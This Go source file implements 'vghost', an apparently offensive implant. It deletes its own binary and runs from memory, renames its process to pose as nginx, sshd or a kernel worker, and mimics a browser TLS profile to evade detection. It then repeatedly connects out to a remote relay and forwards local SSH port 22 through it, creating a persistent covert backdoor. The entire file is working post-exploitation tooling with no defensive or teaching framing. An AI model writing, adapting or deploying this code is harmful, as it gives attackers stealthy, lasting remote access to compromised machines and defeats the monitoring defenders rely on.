package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	"github.com/blackopsbos/svenom/pkg/evasion"
	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
)

var (
	secretKey  = flag.String("Sk", "", "Secret key")
	domain     = flag.String("d", "", "Relay domain/IP")
	relayPort  = flag.String("P", "443", "Relay port")
	localPort  = flag.String("p", "22", "Local port to expose")
	mimic      = flag.String("mimic", "chrome", "Browser profile")
	noTLS      = flag.Bool("no-tls", false, "Disable TLS")
	retryMax   = flag.Int("retry", 0, "Max retries (0=infinite)")
	retryDelay = flag.Int("retry-delay", 5, "Retry delay sec")
)

func main() {
	flag.Parse()
	if *secretKey == "" || *domain == "" {
		fmt.Fprintf(os.Stderr, "Usage: vghost --Sk <secret> -d <domain>\n")
		os.Exit(1)
	}

	// Fileless execution
	self, err := os.ReadFile(os.Args[0])
	if err == nil {
		os.Remove(os.Args[0])
		if err := memfd.ExecuteInMemory(self, os.Args, os.Environ()); err != nil {
			log.Printf("memfd fallback: %v", err)
		} else {
			return
		}
	}

	// Masquerade
	masks := []string{"nginx", "sshd", "systemd-journal", "kworker/u8:1"}
	maskName := masks[time.Now().Unix()%int64(len(masks))]
	masquerade.DisguiseAs(maskName, fmt.Sprintf("/usr/sbin/%s --daemon", maskName))

	evMgr := evasion.NewManager(evasion.BrowserProfile(*mimic))
	addr := net.JoinHostPort(*domain, *relayPort)
	retries := 0

	for {
		log.Printf("Connecting to %s (attempt %d)", addr, retries+1)

		var conn net.Conn
		if *noTLS {
			conn, err = evMgr.DialDirect(context.Background(), "tcp", addr)
		} else {
			conn, err = evMgr.DialContext(context.Background(), "tcp", addr)
		}
		if err != nil {
			log.Printf("Dial failed: %v", err)
			retries++
			if *retryMax > 0 && retries >= *retryMax {
				log.Fatal("Max retries reached")
			}
			time.Sleep(time.Duration(*retryDelay) * time.Second)
			continue
		}

		fmt.Fprintf(conn, "%s\n", *secretKey)
		log.Printf("Connected, waiting for peer...")

		localConn, err := net.DialTimeout("tcp", net.JoinHostPort("127.0.0.1", *localPort), 10*time.Second)
		if err != nil {
			log.Printf("Local service unreachable: %v", err)
			conn.Close()
			time.Sleep(time.Duration(*retryDelay) * time.Second)
			continue
		}

		go io.Copy(localConn, conn)
		io.Copy(conn, localConn)
		localConn.Close()
		conn.Close()
		log.Printf("Connection closed, reconnecting...")
		retries = 0
		time.Sleep(1 * time.Second)
	}
}